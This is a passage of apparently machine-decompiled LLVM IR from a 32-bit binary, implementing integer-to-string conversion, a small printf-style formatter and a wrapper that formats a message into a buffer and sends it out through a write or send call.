  uselistorder label %dec_label_pc_87f8, { 1, 0 }
  uselistorder label %dec_label_pc_87e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_87cc, { 1, 0 }
  uselistorder label %dec_label_pc_8778, { 1, 0 }
}

define i32 @function_88b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_88b0:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_88b4 = load i32, i32* @fp, align 4
  store i32 35004, i32* %stack_var_-4, align 4
  %v2_88b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88b8, i32* @fp, align 4
  %v1_88ec = icmp slt i32 %arg2, 0
  %v2_88ec = icmp eq i32 %arg2, 0
  br i1 %v2_88ec, label %dec_label_pc_88f4, label %dec_label_pc_8928

dec_label_pc_88f4:                                ; preds = %dec_label_pc_88b0
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8918 = bitcast i32* %stack_var_-28 to i8*
  %v6_8918 = call i32 @function_8728(i32 %arg1, i8* %v5_8918, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_8a88

dec_label_pc_8928:                                ; preds = %dec_label_pc_88b0
  %v2_892c = icmp eq i32 %arg4, 0
  br i1 %v2_892c, label %dec_label_pc_8960, label %dec_label_pc_8934

dec_label_pc_8934:                                ; preds = %dec_label_pc_8928
  %v7_8938 = icmp eq i32 %arg3, 10
  br i1 %v7_8938, label %dec_label_pc_8940, label %dec_label_pc_8960

dec_label_pc_8940:                                ; preds = %dec_label_pc_8934
  br i1 %v1_88ec, label %dec_label_pc_894c, label %dec_label_pc_8960

dec_label_pc_894c:                                ; preds = %dec_label_pc_8940
  %v1_8958 = sub i32 0, %arg2
  br label %dec_label_pc_8960

dec_label_pc_8960:                                ; preds = %dec_label_pc_8940, %dec_label_pc_8934, %dec_label_pc_8928, %dec_label_pc_894c
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_8928 ], [ %v1_8958, %dec_label_pc_894c ], [ %arg2, %dec_label_pc_8940 ], [ %arg2, %dec_label_pc_8934 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8928 ], [ 1, %dec_label_pc_894c ], [ 0, %dec_label_pc_8940 ], [ 0, %dec_label_pc_8934 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_89f44 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_89f44, label %dec_label_pc_89fc, label %dec_label_pc_897c.lr.ph

dec_label_pc_897c.lr.ph:                          ; preds = %dec_label_pc_8960
  %v7_899c = icmp slt i32 %arg3, 10
  %v1_89a4 = add i32 %arg7, -58
  %v2_89ac = add i32 %v1_89a4, %arg3
  br label %dec_label_pc_897c

dec_label_pc_897c:                                ; preds = %dec_label_pc_897c.lr.ph, %dec_label_pc_89b4
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_897c.lr.ph ], [ %v0_89e4, %dec_label_pc_89b4 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_897c.lr.ph ], [ %v5_89bc, %dec_label_pc_89b4 ]
  %v2_8988 = call i32 @function_103c8(i32 %stack_var_-52.16, i32 %arg3)
  br i1 %v7_899c, label %dec_label_pc_89b4, label %dec_label_pc_89a0

dec_label_pc_89a0:                                ; preds = %dec_label_pc_897c
  br label %dec_label_pc_89b4

dec_label_pc_89b4:                                ; preds = %dec_label_pc_897c, %dec_label_pc_89a0
  %stack_var_-64.0 = phi i32 [ %arg3, %dec_label_pc_897c ], [ %v2_89ac, %dec_label_pc_89a0 ]
  %v4_89b4 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_89b8 = add i32 %v4_89b4, -1
  %v5_89bc = inttoptr i32 %v1_89b8 to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_89d4 = trunc i32 %fold to i8
  store i8 %v1_89d4, i8* %v5_89bc, align 1
  store i32 %stack_var_-52.16, i32* @r0, align 4
  store i32 %arg3, i32* @r1, align 4
  %v0_89e4 = call i32 @function_102cc()
  %v2_89f4 = icmp eq i32 %v0_89e4, 0
  br i1 %v2_89f4, label %dec_label_pc_89fc, label %dec_label_pc_897c

dec_label_pc_89fc:                                ; preds = %dec_label_pc_89b4, %dec_label_pc_8960
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_8960 ], [ %v5_89bc, %dec_label_pc_89b4 ]
  %v2_8a00 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_8a00, label %dec_label_pc_8a64, label %dec_label_pc_8a08

dec_label_pc_8a08:                                ; preds = %dec_label_pc_89fc
  %v3_8a08 = load i32, i32* %stack_var_0, align 4
  %v2_8a0c = icmp eq i32 %v3_8a08, 0
  br i1 %v2_8a0c, label %dec_label_pc_8a4c, label %dec_label_pc_8a14

dec_label_pc_8a14:                                ; preds = %dec_label_pc_8a08
  %v1_8a18 = and i32 %arg6, 2
  %v2_8a1c = icmp eq i32 %v1_8a18, 0
  br i1 %v2_8a1c, label %dec_label_pc_8a4c, label %dec_label_pc_8a24

dec_label_pc_8a24:                                ; preds = %dec_label_pc_8a14
  %v2_8a2c = inttoptr i32 %arg1 to i32*
  %v3_8a2c = call i32 @function_86b8(i32* %v2_8a2c, i32 45)
  %v3_8a3c = load i32, i32* %stack_var_0, align 4
  %v1_8a40 = add i32 %v3_8a3c, -1
  store i32 %v1_8a40, i32* %stack_var_0, align 4
  br label %dec_label_pc_8a64

dec_label_pc_8a4c:                                ; preds = %dec_label_pc_8a14, %dec_label_pc_8a08
  %v4_8a4c = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_8a50 = add i32 %v4_8a4c, -1
  %v5_8a54 = inttoptr i32 %v1_8a50 to i8*
  store i8 45, i8* %v5_8a54, align 1
  br label %dec_label_pc_8a64

dec_label_pc_8a64:                                ; preds = %dec_label_pc_89fc, %dec_label_pc_8a24, %dec_label_pc_8a4c
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_89fc ], [ %v5_8a54, %dec_label_pc_8a4c ], [ %stack_var_-68.0.lcssa, %dec_label_pc_8a24 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_89fc ], [ 0, %dec_label_pc_8a4c ], [ 1, %dec_label_pc_8a24 ]
  %v3_8a6c = load i32, i32* %stack_var_0, align 4
  %v6_8a74 = call i32 @function_8728(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_8a6c, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8a80 = add i32 %v6_8a74, %stack_var_-56.0
  br label %dec_label_pc_8a88

dec_label_pc_8a88:                                ; preds = %dec_label_pc_88f4, %dec_label_pc_8a64
  %storemerge2 = phi i32 [ %v2_8a80, %dec_label_pc_8a64 ], [ %v6_8918, %dec_label_pc_88f4 ]
  store i32 %v3_88b4, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_89bc, { 0, 2, 1 }
  uselistorder i32 %stack_var_-52.16, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 3, 4, 0, 5, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a88, { 1, 0 }
  uselistorder label %dec_label_pc_8a64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_89b4, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8960, { 3, 0, 1, 2 }
}

define i32 @function_8a9c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8a9c:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8a9c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8a9c, i32* @ip, align 4
  store i32 35496, i32* %stack_var_-4, align 4
  %v2_8aa4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8aa4, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8e5029 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8e5431 = icmp eq i8 %v2_8e5029, 0
  br i1 %v2_8e5431, label %dec_label_pc_8e5c, label %dec_label_pc_8ac4.lr.ph

dec_label_pc_8ac4.lr.ph:                          ; preds = %dec_label_pc_8a9c
  %v5_8e08 = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8ac4

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8ac4.lr.ph, %dec_label_pc_8e40
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8ac4.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8e40 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8ac4.lr.ph ], [ %v1_8e44, %dec_label_pc_8e40 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8ac4.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8e40 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8ac4.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8e40 ]
  %v2_8ac8 = load i8, i8* %stack_var_-32.435, align 1
  %v7_8acc = icmp eq i8 %v2_8ac8, 37
  br i1 %v7_8acc, label %dec_label_pc_8ad4, label %dec_label_pc_8e20

dec_label_pc_8ad4:                                ; preds = %dec_label_pc_8ac4
  %v1_8ad8 = add i32 %stack_var_-32.4.in34, 1
  %v5_8adc = inttoptr i32 %v1_8ad8 to i8*
  %v2_8af4 = load i8, i8* %v5_8adc, align 1
  %v2_8af8 = icmp eq i8 %v2_8af4, 0
  br i1 %v2_8af8, label %dec_label_pc_8e5c, label %dec_label_pc_8b00

dec_label_pc_8b00:                                ; preds = %dec_label_pc_8ad4
  %v2_8b04 = load i8, i8* %v5_8adc, align 1
  %v7_8b08 = icmp eq i8 %v2_8b04, 37
  br i1 %v7_8b08, label %dec_label_pc_8e20, label %dec_label_pc_8b10

dec_label_pc_8b10:                                ; preds = %dec_label_pc_8b00
  %v2_8b14 = load i8, i8* %v5_8adc, align 1
  %v7_8b18 = icmp eq i8 %v2_8b14, 45
  br i1 %v7_8b18, label %dec_label_pc_8b20, label %dec_label_pc_8b50.preheader

dec_label_pc_8b20:                                ; preds = %dec_label_pc_8b10
  %v1_8b24 = add i32 %stack_var_-32.4.in34, 2
  %v5_8b28 = inttoptr i32 %v1_8b24 to i8*
  br label %dec_label_pc_8b50.preheader

dec_label_pc_8b50.preheader:                      ; preds = %dec_label_pc_8b20, %dec_label_pc_8b10
  %stack_var_-32.0.ph = phi i8* [ %v5_8adc, %dec_label_pc_8b10 ], [ %v5_8b28, %dec_label_pc_8b20 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8b10 ], [ 1, %dec_label_pc_8b20 ]
  %v4_8b502 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_8b543 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_8b587 = icmp eq i8 %v2_8b543, 48
  br i1 %v7_8b587, label %dec_label_pc_8b38, label %dec_label_pc_8b9c.preheader

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8b50.preheader, %dec_label_pc_8b38
  %v4_8b509 = phi i32 [ %v1_8b3c, %dec_label_pc_8b38 ], [ %v4_8b502, %dec_label_pc_8b50.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_8b48, %dec_label_pc_8b38 ], [ %stack_var_-48.0.ph, %dec_label_pc_8b50.preheader ]
  %v1_8b3c = add i32 %v4_8b509, 1
  %v5_8b40 = inttoptr i32 %v1_8b3c to i8*
  %v1_8b48 = or i32 %stack_var_-48.08, 2
  %v2_8b54 = load i8, i8* %v5_8b40, align 1
  %v7_8b58 = icmp eq i8 %v2_8b54, 48
  br i1 %v7_8b58, label %dec_label_pc_8b38, label %dec_label_pc_8b9c.preheader

dec_label_pc_8b9c.preheader:                      ; preds = %dec_label_pc_8b38, %dec_label_pc_8b50.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_8b50.preheader ], [ %v1_8b48, %dec_label_pc_8b38 ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_8b50.preheader ], [ %v5_8b40, %dec_label_pc_8b38 ]
  %v4_8b9c11 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8ba012 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8ba012, 48
  br i1 %tmp60, label %dec_label_pc_8bbc, label %dec_label_pc_8bac

dec_label_pc_8b64:                                ; preds = %dec_label_pc_8bac
  %v2_8b70 = mul i32 %stack_var_-52.019, 10
  %v2_8b7c = load i8, i8* %stack_var_-32.120, align 1
  %v3_8b7c = zext i8 %v2_8b7c to i32
  %v1_8b80 = add i32 %v2_8b70, -48
  %v2_8b88 = add i32 %v1_8b80, %v3_8b7c
  %v1_8b94 = add i32 %v4_8b9c21, 1
  %v5_8b98 = inttoptr i32 %v1_8b94 to i8*
  %v2_8ba0 = load i8, i8* %v5_8b98, align 1
  %tmp61 = icmp ult i8 %v2_8ba0, 48
  br i1 %tmp61, label %dec_label_pc_8bbc, label %dec_label_pc_8bac

dec_label_pc_8bac:                                ; preds = %dec_label_pc_8b9c.preheader, %dec_label_pc_8b64
  %v4_8b9c21 = phi i32 [ %v1_8b94, %dec_label_pc_8b64 ], [ %v4_8b9c11, %dec_label_pc_8b9c.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8b98, %dec_label_pc_8b64 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8b9c.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8b88, %dec_label_pc_8b64 ], [ 0, %dec_label_pc_8b9c.preheader ]
  %v2_8bb0 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8bb0, 58
  br i1 %tmp62, label %dec_label_pc_8b64, label %dec_label_pc_8bbc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8b64, %dec_label_pc_8bac, %dec_label_pc_8b9c.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8b9c.preheader ], [ %v2_8b88, %dec_label_pc_8b64 ], [ %stack_var_-52.019, %dec_label_pc_8bac ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8b9c.preheader ], [ %v5_8b98, %dec_label_pc_8b64 ], [ %stack_var_-32.120, %dec_label_pc_8bac ]
  %v2_8bc0 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8bc4 = icmp eq i8 %v2_8bc0, 115
  br i1 %v7_8bc4, label %dec_label_pc_8bcc, label %dec_label_pc_8c30

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8bbc
  %v1_8bd0 = add i32 %stack_var_-36.133, 4
  %v1_8bdc = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8bdc = load i32, i32* %v1_8bdc, align 4
  %v2_8be8 = icmp eq i32 %v2_8bdc, 0
  br i1 %v2_8be8, label %dec_label_pc_8bfc, label %dec_label_pc_8bf0

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8bcc
  %v5_8bf4 = inttoptr i32 %v2_8bdc to i8*
  br label %dec_label_pc_8c04

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8bcc
  br label %dec_label_pc_8c04

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8bf0, %dec_label_pc_8bfc
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19a30.27, i32 0, i32 0), %dec_label_pc_8bfc ], [ %v5_8bf4, %dec_label_pc_8bf0 ]
  %v7_8c18 = call i32 @function_8728(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8c24 = add i32 %v7_8c18, %stack_var_-44.132
  br label %dec_label_pc_8e40

dec_label_pc_8c30:                                ; preds = %dec_label_pc_8bbc
  %v2_8c34 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c38 = icmp eq i8 %v2_8c34, 100
  br i1 %v7_8c38, label %dec_label_pc_8c40, label %dec_label_pc_8c94

dec_label_pc_8c40:                                ; preds = %dec_label_pc_8c30
  %v1_8c44 = add i32 %stack_var_-36.133, 4
  %v1_8c50 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c50 = load i32, i32* %v1_8c50, align 4
  %v7_8c7c = call i32 @function_88b0(i32 %tmp, i32 %v2_8c50, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c88 = add i32 %v7_8c7c, %stack_var_-44.132
  br label %dec_label_pc_8e40

dec_label_pc_8c94:                                ; preds = %dec_label_pc_8c30
  %v2_8c98 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c9c = icmp eq i8 %v2_8c98, 120
  br i1 %v7_8c9c, label %dec_label_pc_8ca4, label %dec_label_pc_8cf8

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8c94
  %v1_8ca8 = add i32 %stack_var_-36.133, 4
  %v1_8cb4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8cb4 = load i32, i32* %v1_8cb4, align 4
  %v7_8ce0 = call i32 @function_88b0(i32 %tmp, i32 %v2_8cb4, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8cec = add i32 %v7_8ce0, %stack_var_-44.132
  br label %dec_label_pc_8e40

dec_label_pc_8cf8:                                ; preds = %dec_label_pc_8c94
  %v2_8cfc = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8d00 = icmp eq i8 %v2_8cfc, 88
  br i1 %v7_8d00, label %dec_label_pc_8d08, label %dec_label_pc_8d5c

dec_label_pc_8d08:                                ; preds = %dec_label_pc_8cf8
  %v1_8d0c = add i32 %stack_var_-36.133, 4
  %v1_8d18 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8d18 = load i32, i32* %v1_8d18, align 4
  %v7_8d44 = call i32 @function_88b0(i32 %tmp, i32 %v2_8d18, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8d50 = add i32 %v7_8d44, %stack_var_-44.132
  br label %dec_label_pc_8e40

dec_label_pc_8d5c:                                ; preds = %dec_label_pc_8cf8
  %v2_8d60 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8d64 = icmp eq i8 %v2_8d60, 117
  br i1 %v7_8d64, label %dec_label_pc_8d6c, label %dec_label_pc_8dc0

dec_label_pc_8d6c:                                ; preds = %dec_label_pc_8d5c
  %v1_8d70 = add i32 %stack_var_-36.133, 4
  %v1_8d7c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8d7c = load i32, i32* %v1_8d7c, align 4
  %v7_8da8 = call i32 @function_88b0(i32 %tmp, i32 %v2_8d7c, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8db4 = add i32 %v7_8da8, %stack_var_-44.132
  br label %dec_label_pc_8e40

dec_label_pc_8dc0:                                ; preds = %dec_label_pc_8d5c
  %v2_8dc4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8dc8 = icmp eq i8 %v2_8dc4, 99
  br i1 %v7_8dc8, label %dec_label_pc_8dd0, label %dec_label_pc_8e40

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8dc0
  %v1_8dd4 = add i32 %stack_var_-36.133, 4
  %v1_8de0 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8de0 = load i32, i32* %v1_8de0, align 4
  %v1_8de4 = urem i32 %v2_8de0, 256
  store i32 %v1_8de4, i32* %stack_var_-18, align 4
  %v6_8e08 = call i32 @function_8728(i32 %tmp, i8* %v5_8e08, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8dd4)
  %v2_8e14 = add i32 %v6_8e08, %stack_var_-44.132
  br label %dec_label_pc_8e40

dec_label_pc_8e20:                                ; preds = %dec_label_pc_8ac4, %dec_label_pc_8b00
  %stack_var_-32.2 = phi i8* [ %v5_8adc, %dec_label_pc_8b00 ], [ %stack_var_-32.435, %dec_label_pc_8ac4 ]
  %v2_8e24 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8e24 = zext i8 %v2_8e24 to i32
  %v3_8e30 = call i32 @function_86b8(i32* %arg1, i32 %v3_8e24)
  %v1_8e38 = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8e40

dec_label_pc_8e40:                                ; preds = %dec_label_pc_8dc0, %dec_label_pc_8dd0, %dec_label_pc_8d6c, %dec_label_pc_8d08, %dec_label_pc_8ca4, %dec_label_pc_8c40, %dec_label_pc_8c04, %dec_label_pc_8e20
  %stack_var_-44.0 = phi i32 [ %v1_8e38, %dec_label_pc_8e20 ], [ %v2_8c24, %dec_label_pc_8c04 ], [ %v2_8c88, %dec_label_pc_8c40 ], [ %v2_8cec, %dec_label_pc_8ca4 ], [ %v2_8d50, %dec_label_pc_8d08 ], [ %v2_8db4, %dec_label_pc_8d6c ], [ %v2_8e14, %dec_label_pc_8dd0 ], [ %stack_var_-44.132, %dec_label_pc_8dc0 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8e20 ], [ %v1_8bd0, %dec_label_pc_8c04 ], [ %v1_8c44, %dec_label_pc_8c40 ], [ %v1_8ca8, %dec_label_pc_8ca4 ], [ %v1_8d0c, %dec_label_pc_8d08 ], [ %v1_8d70, %dec_label_pc_8d6c ], [ %v1_8dd4, %dec_label_pc_8dd0 ], [ %stack_var_-36.133, %dec_label_pc_8dc0 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8e20 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c04 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c40 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ca4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8d08 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8d6c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8dd0 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8dc0 ]
  %v4_8e40 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8e44 = add i32 %v4_8e40, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8e44 to i8*
  %v2_8e50 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8e54 = icmp eq i8 %v2_8e50, 0
  br i1 %v2_8e54, label %dec_label_pc_8e5c, label %dec_label_pc_8ac4

dec_label_pc_8e5c:                                ; preds = %dec_label_pc_8ad4, %dec_label_pc_8e40, %dec_label_pc_8a9c
  %stack_var_-44.1.lcssa = phi i32 [ 0, %dec_label_pc_8a9c ], [ %stack_var_-44.132, %dec_label_pc_8ad4 ], [ %stack_var_-44.0, %dec_label_pc_8e40 ]
  %v2_8e60 = icmp eq i32* %arg1, null
  br i1 %v2_8e60, label %dec_label_pc_8e78, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e5c
  %v2_8e6c = load i32, i32* %arg1, align 4
  %v3_8e74 = inttoptr i32 %v2_8e6c to i8*
  store i8 0, i8* %v3_8e74, align 1
  br label %dec_label_pc_8e78

dec_label_pc_8e78:                                ; preds = %dec_label_pc_8e5c, %dec_label_pc_8e68
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8b3c, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8adc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_88b0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8e78, { 1, 0 }
  uselistorder label %dec_label_pc_8e5c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8e40, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8e20, { 1, 0 }
  uselistorder label %dec_label_pc_8c04, { 1, 0 }
  uselistorder label %dec_label_pc_8bbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8bac, { 1, 0 }
  uselistorder label %dec_label_pc_8b38, { 1, 0 }
  uselistorder label %dec_label_pc_8ac4, { 1, 0 }
}

define i32 @function_8e90(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8e90:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 36512, i32* %stack_var_-20, align 4
  %v2_8e9c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8e9c, i32* @fp, align 4
  %v4_8ea8 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8ebc = call i32 @function_8a9c(i32* null, i32 %arg1, i32 %v4_8ea8)
  ret i32 %v4_8ebc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8ed4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8ed4:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8edc = load i32, i32* @fp, align 4
  store i32 36580, i32* %stack_var_-16, align 4
  %v2_8ee0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8ee0, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8eec = ptrtoint i32* %stack_var_-8 to i32
  %v4_8f04 = call i32 @function_8a9c(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8eec)
  store i32 %v3_8edc, i32* @fp, align 4
  ret i32 %v4_8f04

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_8f1c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8f1c:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8f20 = load i32, i32* @r2, align 4
  store i32 %v6_8f20, i32* %stack_var_-8, align 4
  %v3_8f24 = load i32, i32* @fp, align 4
  store i32 36652, i32* %stack_var_-16, align 4
  %v2_8f28 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8f28, i32* @fp, align 4
  %v1_8f38 = call i32 @function_12b00(i32 2048)
  store i32 %v1_8f38, i32* %stack_var_-44, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8f54 = inttoptr i32 %v1_8f38 to i8*
  %v3_8f54 = call i32 @function_11f30(i8* %v2_8f54, i32 0)
  %v2_8f60 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8f80 = call i32 @function_8a9c(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8f60)
  store i32 %v1_8f38, i32* @r0, align 4
  %v0_8f88 = call i32 @function_11fd0()
  %v2_8f98 = add i32 %v0_8f88, %v1_8f38
  %v3_8fa0 = inttoptr i32 %v2_8f98 to i8*
  store i8 10, i8* %v3_8fa0, align 1
  store i32 %v1_8f38, i32* @r0, align 4
  %v0_8fa8 = call i32 @function_11fd0()
  %v4_8fc0 = call i32 @function_127fc(i32 %arg1, i32 %v1_8f38, i32 %v0_8fa8, i32 16384)
  store i32 %v1_8f38, i32* @r0, align 4
  %v0_8fd0 = call i32 @function_13684()
  store i32 %v3_8f24, i32* @fp, align 4
  ret i32 %v4_8fc0

; uselistorder directives
  uselistorder i32 %v1_8f38, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

